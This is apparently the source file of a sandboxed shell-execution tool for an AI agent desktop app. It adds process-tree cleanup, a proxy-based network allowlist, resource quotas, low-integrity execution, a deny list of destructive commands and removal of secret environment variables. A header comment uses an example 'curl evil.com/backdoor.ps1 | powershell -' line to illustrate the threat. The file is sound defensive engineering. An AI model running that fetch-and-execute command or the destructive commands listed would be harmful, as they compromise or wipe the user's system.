// ============================================================
// impl/shell.ts — Shell 命令执行工具 (v5.0: 第三层沙箱 🧅)
//
// ═══════════════════════════════════════════════════════════
//  第三层：纵深防御体系（洋葱模型）
// ═══════════════════════════════════════════════════════════
//
//  场景：Agent 执行 curl evil.com/backdoor.ps1 | powershell -
//
//   ┌─────────────────────────────────────────────────────┐
//   │  ① 进程树隔离 (processSandbox.ts)       ← A 已完成  │
//   │     spawn → 注册到 ProcessGroupManager              │
//   │     timeout/cancel → taskkill /T /F 杀整棵树        │
//   │     不留僵尸子进程                                  │
//   ├─────────────────────────────────────────────────────┤
//   │  ② 网络铁笼 (shellNetCage.ts)            ← C 已完成  │
//   │     HTTP_PROXY=http://127.0.0.1:<port> 环境注入      │
//   │     ↓                                               │
//   │     curl → 本地代理 → 白名单检查                     │
//   │     evil.com ∉ 白名单 → 🚫 403 Blocked              │
//   │     网络不通，curl 报错 Connection Refused           │
//   ├─────────────────────────────────────────────────────┤
//   │  ③ 资源配额监控 (shellMonitor.ts)        ← B 已完成  │
//   │     每 3 秒检查:                                     │
//   │     - 内存 > 500MB     → 立即 kill                   │
//   │     - CPU > 50% × 15s  → kill                       │
//   │     - 子进程 > 50 个   → kill (fork 炸弹)            │
//   │     监控失败 → killProcessTree → 整棵树消失          │
//   ├─────────────────────────────────────────────────────┤
//   │  ④ 文件围墙 (shellFileWall.ts)          ← D 已完成  │
//   │     OS Integrity Level 内核级强制:                   │
//   │     - runas /trustlevel:0x10000 降级 Low IL         │
//   │     - Low IL 进程不可写 Medium IL 目录               │
//   │     - 即使绕过①②③，写了文件也只能写沙箱目录           │
//   └─────────────────────────────────────────────────────┘
//                                    ↓
//   💥 安全 — 每一层都足以单独阻止攻击，四层叠加零信任
//
// ═══════════════════════════════════════════════════════════
//  各子模块说明
// ═══════════════════════════════════════════════════════════
//
//  A | processSandbox.ts — 进程树隔离 / Job Object 管理
//  B | shellMonitor.ts  — 资源配额监控 (CPU/内存/子进程)
//  C | shellNetCage.ts  — 网络铁笼 (HTTP_PROXY 劫持 + 白名单)
//  D | shellFileWall.ts — 文件围墙 (OS Integrity Level 强制)
//
//  🔧 集成入口：executeSandboxed() 集成了所有四层
//     (A) getProcessManager().register()      ← 进程树跟踪
//     (B) monitor.start(pid, callback)        ← 资源配额监控
//     (C) await getNetCage() + 注入 HTTP_PROXY ← 网络铁笼
//     (D) wrapLowIntegrity(command)           ← 文件围墙
//
// ═══════════════════════════════════════════════════════════
//
// 🔐 v4.0: 沙箱化改造
//   - exec → spawn（默认无 shell，减少注入面）
//   - 命令白名单 + 危险模式拦截清单
//   - 环境变量清理（消除敏感泄露）
//   - cwd 强制限制在工作区内（除非显式授权）
//   - 超时 + 最大输出限制
//
// v3.6: +拦截 explorer 命令 → 重定向到 open_file
//       +拒绝 explorer shell:{CLSID} 模式 + 教育提示
// v3.1: 智能拦截 start 命令 → 自动转为 open_file 调用
// ============================================================

import { spawn, exec } from 'child_process'
import * as path from 'path'
import * as fs from 'fs'
import type { ToolDef, ToolResult } from '../types'
import { getProcessManager, killProcessTree } from '../../processSandbox'
import { getShellMonitor } from './shellMonitor'
import { getNetCage } from './shellNetCage'
import { ensureFileWallSandbox, wrapLowIntegrity, stripExitMarker, markRunasUnavailable, probeRunasAvailability, decideLowIL } from './shellFileWall'

export const shellExecDef: ToolDef = {
  name: 'shell_exec',
  description: '执行系统命令 (npm/pip/构建/编译/运行脚本/git等)。⚠️ 打开文件/程序/URL/文件夹必须用 open_file，禁止用 shell_exec 或 explorer 命令。',
  params: {
    command: { type: 'string', description: '要执行的命令', required: true },
    cwd: { type: 'string', description: '工作目录 (可选)', required: false },
    timeout: { type: 'number', description: '超时秒数，默认30', required: false },
    allowShell: { type: 'boolean', description: '是否使用 shell 解析 (默认 false，部分命令如 npm/pip/git 需要)', required: false },
  },
  toolsets: ['agent'],
  dangerous: true,
  blockedInChild: false,
}

// ═══════════════════════════════════════════════════════════
// 🔐 安全沙箱配置
// ═══════════════════════════════════════════════════════════

/** 危险命令模式——包含这些的直接拒绝执行 */
const DANGEROUS_PATTERNS: RegExp[] = [
  /(^|\s)(rm|del|rd|rmdir|format|fdisk|dd)\s.*(\/[-a-zA-Z]*[srfq]|[-]{2}recursive|[-]{2}force)/i,
  /(^|\s)(rm|del|rd)\s.*(\/|\\|\.\.).*$/im,
  /format\s+\w\s*[:\/\\]/i,
  /fdisk\s/i,
  /dd\s+if=/i,
  /(^|\|)shutdown\s/i,
  /(^|\|)poweroff\s/i,
  /(^|\|)halt\s/i,
  /mkfs\.\w+\s/i,
  /(^|\|)(chmod|chown|attrib)\s.*(\/R|\/S|[-]R|777)/i,
  /(^|\|)(reg\s+delete|reged|regini)\s/i,
  /(^|\|)(wevtutil|wmic)\s.*delete/i,
]

/** 隐式白名单：需要 shell 解析才能正常工作的命令前缀 */
const NEEDS_SHELL_PREFIXES = [
  'npm ', 'npm\t',
  'pip ', 'pip\t', 'pip3 ', 'pip3\t',
  'npx ', 'npx\t',
  'yarn ', 'yarn\t',
  'pnpm ', 'pnpm\t',
  'git ', 'git\t',
  'node ', 'node\t',
  'python ', 'python\t', 'python3 ', 'python3\t',
  'tsc ', 'tsc\t',
  'rustc ', 'cargo ', 'cargo\t',
  'make ', 'make\t',
  'cmake ', 'cmake\t',
]

/** 默认允许的工作目录（用户传入的 cwd 必须解析到这个范围内） */
const ALLOWED_CWD_BASES = [
  process.cwd(),                                          // 当前进程工作目录
  path.dirname(process.cwd()),                            // 上一级
  process.env.USERPROFILE || process.env.HOME || '',      // 用户目录
  process.env.LOCALAPPDATA || '',                         // AppData\Local
].filter(Boolean)

/** 需要清理的环境变量黑名单（包含敏感信息的） */
const SENSITIVE_ENV_KEYS = [
  'TOKEN', 'SECRET', 'PASSWORD', 'PASSWD', 'API_KEY', 'APIKEY',
  'ACCESS_KEY', 'ACCESSKEY', 'SECRET_KEY', 'SECRETKEY',
  'AUTH', 'CREDENTIAL', 'PRIVATE_KEY', 'PRIVATEKEY',
  'AWS_SECRET', 'AZURE_', 'GITHUB_TOKEN', 'GH_TOKEN',
]

// ═══════════════════════════════════════════════════════════
// 安全辅助函数
// ═══════════════════════════════════════════════════════════

/** 检查命令是否匹配危险模式 */
function isDangerousCommand(command: string): boolean {
  for (const pattern of DANGEROUS_PATTERNS) {
    if (pattern.test(command)) {return true}
  }
  return false
}

/** 判断命令是否需要 shell 解析 */
function needsShell(command: string): boolean {
  const trimmed = command.trim()
  for (const prefix of NEEDS_SHELL_PREFIXES) {
    if (trimmed.startsWith(prefix)) {return true}
  }
  // 需要管道、重定向、变量展开等
  if (trimmed.includes('|') || trimmed.includes('>') || trimmed.includes('$')) {return true}
  return false
}

/** 清理环境变量中的敏感信息 */
function createCleanEnv(): NodeJS.ProcessEnv {
  const env = { ...process.env }
  for (const key of Object.keys(env)) {
    const upper = key.toUpperCase()
    for (const sensitive of SENSITIVE_ENV_KEYS) {
      if (upper.includes(sensitive)) {
        delete env[key]
        break
      }
    }
  }
  // 明确删除已知敏感变量
  delete env.GITHUB_TOKEN
  delete env.GH_TOKEN
  delete env.NPM_TOKEN
  return env
}

/** 验证并解析 cwd */
function resolveSafeCwd(userCwd: string | undefined): string {
  if (!userCwd) {return process.cwd()}
  const resolved = path.resolve(userCwd)

  // 检查是否在允许范围内
  for (const base of ALLOWED_CWD_BASES) {
    if (!base) {continue}
    try {
      if (resolved.startsWith(base) || resolved.startsWith(path.resolve(base))) {
        return resolved
      }
    } catch { /* 继续检查下一个 */ }
  }

  // 不在白名单中但确实存在的路径，允许执行但记安全日志
  if (fs.existsSync(resolved)) {
    console.warn(`[Shell沙箱] cwd 不在默认白名单中但已放行: ${resolved}`)
    return resolved
  }

  // 不存在则退回到当前目录
  console.warn(`[Shell沙箱] cwd 无效已回退: ${userCwd}`)
  return process.cwd()
}

// ═══════════════════════════════════════════════════════════
// explorer / start 拦截（同上）
// ═══════════════════════════════════════════════════════════

function parseExplorerCommand(command: string): { action: 'redirect' | 'reject'; target?: string } {
  const rest = command.replace(/^\s*explorer\s*/i, '').trim()
  if (!rest) {return { action: 'reject' }}
  const fixed = rest
    .replace(/shel[：:]\s*\{/i, 'shell:{')
    .replace(/shel\{/i, 'shell:{')
    .replace(/shell\{/i, 'shell:{')
    .replace(/\)\s*$/, '}')
    .replace(/[：;]\s*\{/, ':{')
  if (/^shell:\{/i.test(fixed)) {return { action: 'reject' }}
  if (/^https?:\/\//i.test(fixed)) {return { action: 'redirect', target: fixed }}
  if (/^[A-Za-z]:/i.test(fixed) || fixed.startsWith('\\\\') || fixed.startsWith('//')) {
    return { action: 'redirect', target: fixed }
  }
  return { action: 'reject' }
}

function parseStartCommand(command: string): string | null {
  const m = command.match(/^start\s+(?:"[^"]*"\s+)?("(?:[^"]|"")+"|https?:\/\/\S+|[^\s]+(?:\s+\S+)*)/i)
  if (!m) {return null}
  let target = m[1].replace(/^"|"$/g, '')
  target = target
    .replace(/^([A-Za-z])(Program\s*Files)\b/i, '$1:\\$2')
    .replace(/^([A-Za-z])(ProgramFiles)\b/i, '$1:\\Program Files')
    .replace(/^([A-Za-z])(Users)\b/i, '$1:\\$2')
    .replace(/^([A-Za-z])(Windows)\b/i, '$1:\\$2')
    .replace(/^([A-Za-z])(Projects?)\b/i, '$1:\\$2')
    .replace(/^([A-Za-z])(Games?)\b/i, '$1:\\$2')
  if (process.platform === 'win32' && target.includes('/') && !target.startsWith('http')) {
    target = target.replace(/\//g, '\\')
  }
  return target || null
}

// ═══════════════════════════════════════════════════════════
// 命令风险分类 — 治理前移
// ═══════════════════════════════════════════════════════════

export type CommandRiskLevel = 'READ' | 'WRITE' | 'DELETE' | 'INSTALL' | 'DESTRUCTIVE' | 'NETWORK' | 'UNKNOWN'

export interface CommandRiskAssessment {
  level: CommandRiskLevel
  label: string
  emoji: string
  description: string
}

/** 对命令进行风险预分类 */
export function classifyCommandRisk(command: string): CommandRiskAssessment {
  const cmd = command.trim().toLowerCase()

  // 破坏性：格式化/擦除/关机
  if (/(^|\s)(format|fdisk|dd|mkfs|mkswap|shutdown|reboot|halt|poweroff)\s/.test(cmd)) {
    return { level: 'DESTRUCTIVE', label: '破坏性', emoji: '☠️', description: '系统级破坏操作，可能导致数据丢失或系统不可用' }
  }
  // 删除：rm/del/rd 带递归/强制
  if (/(^|\s)(rm|del|rd|rmdir)\s.*(\/[-a-zA-Z]*[srfq]|[-]{2}recursive|[-]{2}force)/.test(cmd)) {
    return { level: 'DELETE', label: '删除', emoji: '🗑️', description: '递归/强制删除操作，可能删除大量文件' }
  }
  // 删除：docker rm / rmi / system prune
  if (/docker\s+(rm|rmi|system\s+prune|volume\s+rm)/.test(cmd)) {
    return { level: 'DELETE', label: '删除', emoji: '🗑️', description: 'Docker 删除操作，会移除容器/镜像/卷' }
  }
  // git push --force / reset --hard
  if (/git\s+(push\s+--force|reset\s+--hard)/.test(cmd)) {
    return { level: 'WRITE', label: '危险写入', emoji: '⚠️', description: 'Git 强制操作，可能丢失提交历史' }
  }
  // 安装：npm install / pip install / cargo install
  if (/(^|\s)(npm|pip|pip3|pnpm|yarn|gem|brew|apt-get|choco|scoop)\s+(install|add|uninstall|remove)/.test(cmd)) {
    return { level: 'INSTALL', label: '安装', emoji: '📦', description: '安装/卸载软件包，会修改系统或项目依赖' }
  }
  // 网络：curl / wget 发送数据
  if (/curl\s+.*-[dF].*\s+https?:\/\//.test(cmd)) {
    return { level: 'NETWORK', label: '网络发送', emoji: '🌐', description: '向远程服务器发送数据（POST/PUT）' }
  }
  // 网络：curl / wget
  if (/(^|\s)(curl|wget)\s/.test(cmd)) {
    return { level: 'NETWORK', label: '网络', emoji: '🌐', description: '网络请求操作' }
  }
  // 写操作：重定向 > / >> 到文件
  if (/>>?\s+\S/.test(cmd) && !/echo\s+.*>>?\s+/.test(cmd)) {
    return { level: 'WRITE', label: '写入', emoji: '✏️', description: '将输出写入文件' }
  }
  // 写操作：mv / cp / rename
  if (/(^|\s)(mv|cp|rename|move|copy)\s/.test(cmd)) {
    return { level: 'WRITE', label: '写入', emoji: '✏️', description: '移动/复制/重命名文件' }
  }
  // 写操作：chmod / chown
  if (/(^|\s)(chmod|chown|attrib)\s/.test(cmd)) {
    return { level: 'WRITE', label: '修改权限', emoji: '🔐', description: '修改文件权限或所有者' }
  }
  // 写操作：文件编辑类
  if (/(^|\s)(sed|awk|tee|truncate)\s/.test(cmd)) {
    return { level: 'WRITE', label: '写入', emoji: '✏️', description: '文件内容修改操作' }
  }
  // 读操作
  if (/(^|\s)(cat|less|more|head|tail|type|dir|ls|find|grep|where|which|echo|print|dir)\s/.test(cmd)) {
    return { level: 'READ', label: '读取', emoji: '📖', description: '读取文件内容或目录列表' }
  }
  // git 只读操作
  if (/git\s+(log|diff|status|branch|show|blame|stash\s+list)/.test(cmd)) {
    return { level: 'READ', label: '读取', emoji: '📖', description: 'Git 只读查询操作' }
  }

  return { level: 'UNKNOWN', label: '未知', emoji: '⚙️', description: 'Lumina 无法自动分类此命令的风险等级' }
}

async function executeSandboxed(command: string, cwd: string, timeoutMs: number, useShell_: boolean): Promise<string> {
  // C: 惰性启动网络铁笼代理（仅首次调用时实际启动，后续复用）
  let netCagePort = 0
  try {
    const cage = await getNetCage()
    netCagePort = cage.getPort()
  } catch {
    console.warn('[Shell沙箱] ⚠️ 网络铁笼启动失败，命令以无代理模式运行')
  }

  // D: 初始化文件围墙沙箱（仅进程生命周期一次）
  const sandboxDir = ensureFileWallSandbox()

  // D: Windows Low IL 包装（runas /trustlevel:0x10000）
  // v6.2 (F1): 先过 7×8 规则库 —— >=HIGH 才降级，普通命令保持正常 IL（避免 npm/build 写不进用户项目）
  let effectiveCommand = command
  let effectiveUseShell = useShell_
  let lowIntegrityWrapped = false
  const lowILDecision = decideLowIL(command)
  if (process.platform === 'win32' && lowILDecision.shouldWrap) {
    const wrapped = wrapLowIntegrity(effectiveCommand, sandboxDir)
    if (wrapped !== effectiveCommand) {
      effectiveCommand = wrapped
      lowIntegrityWrapped = true
      effectiveUseShell = true  // runas 需要 cmd.exe 解析
    }
  }

  return new Promise((resolve, reject) => {
    const cleanEnv = createCleanEnv()

    // C: 注入代理环境变量劫持子进程网络请求
    if (netCagePort > 0) {
      const proxyUrl = `http://127.0.0.1:${netCagePort}`
      cleanEnv.HTTP_PROXY = proxyUrl
      cleanEnv.http_proxy = proxyUrl
      cleanEnv.HTTPS_PROXY = proxyUrl
      cleanEnv.https_proxy = proxyUrl
      // 内部/本地地址不走代理
      cleanEnv.NO_PROXY = '127.0.0.1,localhost,::1,.local'
      cleanEnv.no_proxy = '127.0.0.1,localhost,::1,.local'
    }
    const escapedCwd = resolveSafeCwd(cwd)

    // 生成进程 ID，用于后续树清理
    const procId = `shell_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`

    // spawn with shell=false (default) 或 shell=true（仅对白名单命令启用）
    const child = spawn(effectiveCommand, [], {
      cwd: escapedCwd,
      shell: effectiveUseShell,
      timeout: timeoutMs,
      windowsHide: true,
      env: cleanEnv,
      stdio: ['pipe', 'pipe', 'pipe'],
      // Windows 上最大避免路径注入
      windowsVerbatimArguments: false,
    })

    // 注册到进程管理器（以便后续整树清理）
    getProcessManager().register(procId, child.pid!, command)

    let stdout = ''
    let stderr = ''
    let killed = false

    // 超时后使用 killProcessTree 替代 child.kill()
    const killTimer = setTimeout(() => {
      killed = true
      // 杀灭整棵进程树（包括子进程的子进程）
      killProcessTree(child.pid!).then((ok) => {
        if (!ok) {
          // taskkill 没找到进程 → 可能已经结束
          console.warn(`[Shell沙箱] 进程树清理可能不完整: PID=${child.pid}`)
        }
        // 额外补一刀：直接杀子进程
        try { child.kill('SIGKILL') } catch { /* 最佳努力 */ }
      })
      // 1 秒后备：确保进程确实没了
      setTimeout(() => {
        try { child.kill('SIGKILL') } catch { /* 已经结束 */ }
      }, 1000)
    }, timeoutMs)

    // B: 启动资源配额监控（内存/CPU/子进程数量）
    const monitor = getShellMonitor()
    let monitorStarted = false
    if (child.pid) {
      monitor.start(child.pid, (event) => {
        // 资源超限 → 杀灭进程树 + 标记 reject
        killed = true
        clearTimeout(killTimer)
        killProcessTree(child.pid!).then(() => {
          try { child.kill('SIGKILL') } catch { /* 最佳努力 */ }
        })
        reject(new Error(`🚫 资源配额超限\n${event.message}`))
      })
      monitorStarted = true
    }

    child.stdout?.on('data', (data: Buffer) => {
      stdout += data.toString()
    })
    child.stderr?.on('data', (data: Buffer) => {
      stderr += data.toString()
    })

    child.on('close', (code) => {
      clearTimeout(killTimer)
      if (monitorStarted && child.pid) {
        monitor.stop(child.pid)
      }
      if (killed) {
        reject(new Error(`命令执行超时 (${timeoutMs / 1000}s)\n${stdout.slice(-500)}`))
        return
      }
      const output = stripExitMarker(stdout || stderr).trim() || '(命令执行成功，无输出)'
      resolve(output.slice(0, 5000))
    })

    child.on('error', (err) => {
      clearTimeout(killTimer)
      if (monitorStarted && child.pid) {
        monitor.stop(child.pid)
      }
      // runas 不可用（如 Secondary Logon 服务禁用）→ 回退标记，后续命令不再包装
      if (lowIntegrityWrapped && (err.message?.includes('ENOENT') || /runas|信任级别/i.test(err.message || ''))) {
        markRunasUnavailable()
      }
      reject(err)
    })
  })
}

// ═══════════════════════════════════════════════════════════
// 主入口
// ═══════════════════════════════════════════════════════════

export async function shellExec(args: Record<string, any>): Promise<ToolResult> {
  const command: string = args.command
  const cwd: string = args.cwd || process.cwd()
  const timeout = (args.timeout || 30) * 1000
  const allowShell = args.allowShell === true

  // 危险命令拦截（安全检查优先于一切）
  if (isDangerousCommand(command)) {
    return {
      callId: '', ok: true,
      content:
        `❌ 命令被沙箱拦截：包含高危操作\n\n` +
        `检测到可能具有破坏性的命令模式。如需执行此类操作，请在 Lumina 的安全配置中\n` +
        `手动解除限制，或通过文件管理工具逐个操作。`,
    }
  }

  // 拦截 explorer 命令
  if (/^\s*explorer\s+/i.test(command)) {
    const parsed = parseExplorerCommand(command)
    if (parsed.action === 'redirect' && parsed.target) {
      try {
        const { shell } = require('electron')
        if (/^https?:\/\//i.test(parsed.target)) {
          await shell.openExternal(parsed.target)
        } else {
          const absPath = path.resolve(cwd, parsed.target)
          await shell.openPath(absPath)
        }
        return { callId: '', ok: true, content: `✅ 已打开: ${parsed.target}\n💡 下次直接用 open_file 工具` }
      } catch (e: any) {
        return { callId: '', ok: false, content: '', error: `打开失败: ${e.message}` }
      }
    }
    return {
      callId: '', ok: true,
      content:
        `❌ 不要用 explorer 打开文件！\n\n` +
        `用 open_file 工具，例如: open_file(target="C:/path/to/file.exe")\n` +
        `你想打开什么文件？直接用 open_file 传路径即可。`,
    }
  }

  // 拦截 start 命令
  if (/^\s*start\s+/i.test(command)) {
    const target = parseStartCommand(command)
    if (target) {
      try {
        const { shell } = require('electron')
        if (/^https?:\/\//i.test(target)) {
          await shell.openExternal(target)
          return { callId: '', ok: true, content: `✅ 已打开: ${target}\n💡 下次用 open_file 工具` }
        }
        const errorMsg = await shell.openPath(target)
        if (errorMsg) {return { callId: '', ok: false, content: '', error: `打开失败: ${errorMsg}` }}
        return { callId: '', ok: true, content: `✅ 已打开: ${target}\n💡 下次用 open_file 工具` }
      } catch (e: any) {
        return { callId: '', ok: false, content: '', error: `打开失败: ${e.message}` }
      }
    }
    return { callId: '', ok: false, content: '', error: `无法解析 start 命令: ${command}. 请用 open_file 工具。` }
  }

  // 命令风险预分类（治理前移）
  const risk = classifyCommandRisk(command)
  const riskBadge = `${risk.emoji} [${risk.label}] ${risk.description}`

  // ── 安全执行 ──
  try {
    // 自动判断是否需要 shell
    const useShell = allowShell || needsShell(command)

    const output = await executeSandboxed(command, cwd, timeout, useShell)
    // 在输出前附加风险标签
    const content = `🛡️ 风险分类: ${riskBadge}\n\n${output}`
    return { callId: '', ok: true, content }
  } catch (err: any) {
    return { callId: '', ok: false, content: '', error: err.message?.slice(0, 1000) || '命令执行失败' }
  }
}
